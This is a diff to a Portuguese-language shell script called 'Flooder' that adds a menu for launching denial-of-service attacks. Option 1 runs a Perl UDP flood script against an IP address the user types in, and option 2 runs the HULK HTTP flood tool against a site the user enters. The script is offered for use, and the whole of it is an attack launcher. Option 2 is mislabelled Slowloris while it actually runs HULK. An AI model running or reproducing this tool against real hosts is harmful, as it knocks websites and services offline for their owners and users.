@@ -1,6 +1,21 @@
 #!/bin/sh
 
-echo -e "Digite o ip que deseja atacar"
-read -p ": " ip
+clear
+echo "     \033[40;1;37m  Flooder  \033[0m"
+echo "\033[1;37mEscolha uma das opço?s:    \033[1;37mPara Sair Ctrl + C\033[1;33m
+[1] Flood.pl \033[1;30m(Flood UDP )\033[1;33m
+[2] Slowloris.pl \033[1;30m(Slowloris.pl )\033[;0m"
+read -p ": " opcao
 
-perl flood.pl $ip 80 65500 800
+case $opcao in
+1)
+ echo -e "Digite o ip que deseja atacar"
+ read -p ": " ip
+ perl flood.pl $ip 80 65500 800 ;;
+2)
+ echo -e "Digite o site"
+ read -p ": " site
+ python hulk -site http://$site 2>/dev/null ;;
+ *)
+  id > /dev/null 2> /dev/null
+esac
